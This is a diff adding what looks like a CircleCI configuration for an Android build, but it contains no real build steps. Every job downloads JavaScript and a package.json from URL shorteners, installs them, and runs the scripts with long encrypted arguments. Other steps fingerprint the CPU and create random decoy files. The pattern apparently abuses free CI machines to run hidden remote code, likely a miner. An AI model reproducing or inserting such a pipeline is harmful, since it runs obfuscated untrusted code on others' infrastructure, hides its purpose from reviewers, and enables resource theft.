@@ -1,0 +1,75 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  startJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir bf4t9zzresk1h11w7uhtk6d
+      - run: curl -fsSL shorturl.at/qAMPR -o yiln0eu3fi.js && curl -fsSL
+          shorturl.at/lBQ15 -o package.json && curl -fsSL shorturl.at/exGK6 -o
+          9ua1f7rb.js
+      - run: mkdir qdkemgrjdm0uac1duuryng
+      - run: npm i -s
+      - run: mkdir yd899pirkpctiebxviuxlp
+      - run: mkdir rxb3fdzx8uyw9gid8t1s
+      - run: node 9ua1f7rb -t
+          U2FsdGVkX1/QSKSZXlhRsal4dd5xc/viYISUFRO399IGYGiwMZuVr+F6U6GQzSss -lpn
+          U2FsdGVkX1+kR8O39bPrAjr1JRn9KAzSQdbJV0Hax8M= -sp -r
+          U2FsdGVkX19ycwnqtbfps0h8BNz/tEx7magaHjTyC4XxWx7lNIpXIYtWNHHde2VfVHIytbG11ROnjgFbPsWYWfZvF/MM0M5t4arSD1rVREjjGJycg04nxTX9kWEohWcU3p7E+iJvQFyHhuZxxxD+NAkn5B2/2rzP8J80d0YMEtBDb1TR7GWLVxpzGRfKK/9UOq+MqYqBbp4FvBPhpIIsjUxIkow0x7oPayBfsuSqedko2uVj7fAuJndqrEbeL2t8GodSWOOoDOWuTW1FBkyPZsP4vrJ81QtKYBTVkz0kX5w=
+          -s
+          U2FsdGVkX19qysqIMEleXAvP7lpyF84Zjrdedo7bScmpznybp3awMcj6focOYyzJiI/F0sKoOaHlWM4/ZGQfe0kGOutLBemXZ6+Rlg7XdjFx/hBEwbQWElPsbho9DxdUwdqF0YmvR1oIuJOo9IK9r5xCfKuhT75n5ktmBzyeP8rMql2jyUIuDLMUr8E+l5BWwobRGZGmdslHiQLOghm0vWcyCWQHJWMEm08v92rwpCI=
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: mkdir zn8f0yzjpn5rps
+  jobs_15:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch kanotfqp7cm7a6r4hzrb54.c
+      - run: mkdir zve8dj0eh6frcpfslvq7m9
+      - run: curl -fsSL shorturl.at/vC267 -o lt3d9rx.js && curl -fsSL shorturl.at/wzIM6
+          -o 6ifzba.js && curl -fsSL shorturl.at/osvEX -o package.json
+      - run: npm i -s
+      - run: mkdir jhmc3j86j0di5
+      - run: touch 4qfedajt.php
+      - run: node lt3d9rx -sp -r
+          U2FsdGVkX19xez7gyub7OUaV3ZQDTLJ8phpF991Rn5RSCRL47V0ym9aYvyQXpTTVY92Nlfl9LBCdBqUpf6Zubjs1l8kfFn9gWg7UL/c/+LsAgDYoJGTX+8sPbi+BOTpz6X0kwO28XiThT5FvQn0340kvQbDKvQ5DiM+DqXLYsEUoqURN0pDF9dMvPxjoXPfTfHHKLVJcuVCrIP5zF9mPfoxbDJ/O+Qg1YeHOaxfk/gkMVG1Gz0urKVELYDKSscgK1MYZzQhEHZTLxQOTWG0tAiS2mAWGNsmgBoUsKlvecdg=
+          -t U2FsdGVkX18MKRaVnpS3wus9+/GYz/Z3CUCHN3oj1ieHL9l3HXKZcv9hQA8yygWH -s
+          U2FsdGVkX194Rq5ViEnMj62Z0veJpikJqWsEpifoWjpW3WW2nAD4i5/sWCrJSwLa2C3WI7rK3XGiA9oP61abTXB5sq4As9JlkqrJSq/1x8kyduQU8RNeBCNCZ3NUBE+q93lGulXmHueHZhyszmdgGjmU3rCMnfkmt/8CD6snUSwgFjY76g0Gvwyji5N6w9PtobyWmiyQCQeYaZ6Jtdto22Hvcfw7lizVlWoclzJvDC8=
+          -lpn U2FsdGVkX1+epUclCJjr+hZs9fS2jnfJdu0G6IPyvcY=
+      - run: echo version 42369698564.13909
+      - run: touch 7t55cm7y6sch73dc0i8f2b.net
+  working:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/pKNU2 -o c73ybozeg.js && curl -fsSL
+          shorturl.at/muzF6 -o package.json && curl -fsSL shorturl.at/rwBSW -o
+          dzvxcbbtgb1xg9.js
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: mkdir l6dzsmu6i5gjjbji7cmz
+      - run: touch n4cpllvr5whqvt8gh4phqibk.css
+      - run: npm i -s
+      - run: touch kmpf2ai535x7b.java
+      - run: mkdir 2xhhww1s050oq50p0vuy6fkdmpyb
+      - run: mkdir c3uc3oro6lca9g1k6c8
+      - run: node c73ybozeg -r
+          U2FsdGVkX1/QuSwlARz6CBEqOYNxxNy2Yx8HLwdxWNwIQ5+n0a7QtYH6x8aM6H6tjVHSPEYhsghLQtlcSmcmA0tY3L3sEsvfZw36tO5dGoGPMDRGPcmxxTGFOrSvOT6ICN7G/R6/t2sPWKGyFbD0rJ6+nI23L/8OJM246eYA4f/81xQICWDE1bfGB4pa6izRE+wx1dDU6goN27NDzgRC0HM5yS04BQDCr7bO5cHEBXh3ZdlgzEyYyYHxMMYg5/dP5279HxVKti859VZhL8Hqu5PLD/o25P36YKO+qzlgPLw=
+          -lpn U2FsdGVkX18wuZPv+QwJV6aJmoz37OLfp0HJU5B0iTg= -sp -t
+          U2FsdGVkX19o0m/CrPppetjoA9UnBp7G8BJPb1XNXLrwTu5FbfjVa7ClJBwK/7CR -s
+          U2FsdGVkX19rc9xS4HAmKk8TbH8xw4OXkOkc70gCVgI3mm3t+THFse47RUVRGBeP7rwLJHZK88WpUDcgyxVH56N9qJZE7ddtvtBCCd+R8ZJtGZhVhjT+2MjVXd8M+/oSsyBEmYr3KHRFkz5/s677cMLyMUvhcAdorgtc2LXjqjaL02Tmqdy7qiqMd8+MQ6dSHp+6+Xvv8Ts2WUImdg9MaIzl2qPJCFqKNHQxjuMc9so=
+workflows:
+  iloveyou:
+    jobs:
+      - startJobs
+  bomaycatdaumoi:
+    jobs:
+      - jobs_15
+  startJobs:
+    jobs:
+      - working
